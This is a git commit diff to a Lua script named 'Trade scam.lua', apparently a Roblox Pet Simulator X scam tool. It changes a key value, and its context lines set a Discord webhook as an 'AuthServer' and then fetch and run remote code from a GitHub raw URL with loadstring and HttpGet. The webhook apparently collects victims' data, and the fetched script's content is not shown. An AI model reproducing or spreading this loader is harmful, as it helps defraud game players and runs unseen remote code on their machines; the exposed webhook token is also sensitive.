97f7e6eff4e00be16c305e01cb516a6abb5d00b7
Psx-Script <120688763+Psx-Script@users.noreply.github.com>
2022-12-17 12:50:09 +0300

    Update Trade scam.lua

--- Trade scam.lua
+++ Trade scam.lua
@@ -1,3 +1,3 @@
-_G.Key = "9931_nadgoB"
+_G.Key = "021naros"
 _G.AuthServer = "https://discord.com/api/webhooks/1052617269177495582/oYPWIyt3VYup7NEDszMiy4tzMLukTNsxcvRPplVxt3xoBgMS5thIyZg_Cn3VHvf5lgGu"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
